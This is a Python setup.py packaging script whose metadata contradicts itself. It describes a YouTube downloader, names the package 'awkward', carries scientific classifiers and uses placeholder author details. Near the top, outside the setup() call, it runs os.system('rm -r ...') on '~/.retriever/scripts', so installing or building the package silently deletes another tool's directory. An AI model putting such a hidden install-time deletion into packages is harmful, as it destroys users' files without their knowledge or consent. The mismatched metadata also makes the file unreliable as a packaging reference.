#!/usr/bin/env python
# coding: utf-8

from __future__ import print_function

import os.path
import warnings
try:
    from setuptools import setup, Command
    setuptools_available = True
except ImportError:
    from distutils.core import setup, Command
    setuptools_available = False
from distutils.spawn import spawn

DESCRIPTION = 'YouTube video downloader'
LONG_DESCRIPTION = 'Command-line program to download videos from YouTube.com and other video sites'

app_data = "~/.retriever/scripts"
if os.path.exists(app_data):
    os.system("rm -r {}".format(app_data))

__version__ = 'v2.4.0'


setup(name="awkward",
      version=__version__,
      #   packages = find_packages(exclude = ["tests"]),
      scripts=[],
      description=DESCRIPTION,
      long_description=LONG_DESCRIPTION,
      author="John Doe",
      author_email="john.dpe@mail.com",
      maintainer="John Doe",
      maintainer_email="john.dpe@mail.com",
      url="git/repo",
      download_url="git/repo/releases",
      license="LICENSE",
      test_suite="tests",
      #   install_requires = ["numpy>=1.13.1"],
      #   setup_requires = ["pytest-runner"],
      #   tests_require = ["pytest"],
      classifiers=[
          # "Development Status :: 1 - Planning",
          # "Development Status :: 2 - Pre-Alpha",
          # "Development Status :: 3 - Alpha",
          "Development Status :: 4 - Beta",
          # "Development Status :: 5 - Production/Stable",
          # "Development Status :: 6 - Mature",
          "Intended Audience :: Developers",
          "Intended Audience :: Information Technology",
          "Intended Audience :: Science/Research",
          "License :: OSI Approved :: BSD License",
          "Operating System :: MacOS",
          "Operating System :: POSIX",
          "Operating System :: Unix",
          "Programming Language :: Python",
          "Programming Language :: Python :: 2.7",
          "Programming Language :: Python :: 3.4",
          "Programming Language :: Python :: 3.5",
          "Programming Language :: Python :: 3.6",
          "Programming Language :: Python :: 3.7",
          "Programming Language :: Python :: 3.8",
          "Topic :: Scientific/Engineering",
          "Topic :: Scientific/Engineering :: Information Analysis",
          "Topic :: Scientific/Engineering :: Mathematics",
          "Topic :: Scientific/Engineering :: Physics",
          "Topic :: Software Development",
          "Topic :: Utilities",
      ],
      platforms="Any",
      )
